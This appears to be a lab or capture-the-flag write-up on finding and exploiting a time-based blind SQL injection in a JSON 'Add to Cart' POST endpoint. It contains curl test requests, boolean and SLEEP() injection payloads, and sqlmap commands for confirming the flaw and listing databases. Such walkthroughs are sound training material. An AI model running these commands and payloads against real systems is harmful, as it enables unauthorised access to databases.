# SQLMap – SQL Injection Exploitation via JSON POST Parameter

## Objective

Identify and exploit a blind SQL injection vulnerability in a JSON-based POST request used by an “Add to Cart” feature in a web application.

---

## Case #1 – Identifying the Attack Surface

### Goal

Find a request parameter that could be vulnerable to SQL injection.

### Initial Approach

I manually browsed the web application (shop.html, index.html) and interacted with available buttons while monitoring the browser Network tab.

Most requests returned static HTML with no useful input fields.

### Key Observation

When clicking "Add to Cart", a POST request was sent to:

action.php

with JSON body:

{"id":1}

This became the main attack surface.

---

## Case #2 – Understanding the Request Behavior

### Captured Request

POST /action.php HTTP/1.1
Content-Type: application/json

{"id":1}

### Observations

- JSON input is used instead of URL parameters
- HTTP 200 OK but empty response
- Endpoint mainly triggered from shop.html

---

## Case #3 – Manual Testing

curl -i -X POST "http://154.57.164.72:30279/action.php" \
-H "Content-Type: application/json" \
--data '{"id":1}'

Tests:

{"id":"1 AND 1=1"}
{"id":"1 AND 1=2"}

Result:
- No visible difference
- Likely blind SQL injection

---

## Case #4 – SQLMap Initial Attempt

sqlmap -u "http://154.57.164.72:30279/action.php?id=1" --batch

Result:
- Not dynamic parameter
- No injection found

---

## Case #5 – SQLMap JSON Test

sqlmap -u "http://154.57.164.72:30279/action.php" --data='{"id":1}' --headers="Content-Type: application/json" --batch

Result:
- Needed correct JSON handling
- Injection surface confirmed

---

## Case #6 – Exploitation

sqlmap -r request.txt --batch --no-cast

Result:
- Time-based blind SQL injection
- MySQL / MariaDB backend
- SLEEP() based payload detected

Example payload:
1 AND (SELECT SLEEP(5))

---

## Case #7 – Enumeration Attempt

sqlmap -r request.txt --dbs --batch --no-cast

Result:
- Time-based extraction unstable
- Database listing unreliable

---

## Key Takeaways

- JSON requests can be SQL injectable
- Blind SQLi may have no visible output
- Burp Suite is essential for correct request capture
- SQLMap requires full request replication (-r request.txt)
- Time-based SQLi is slow but accurate
- Manual validation is required before automation
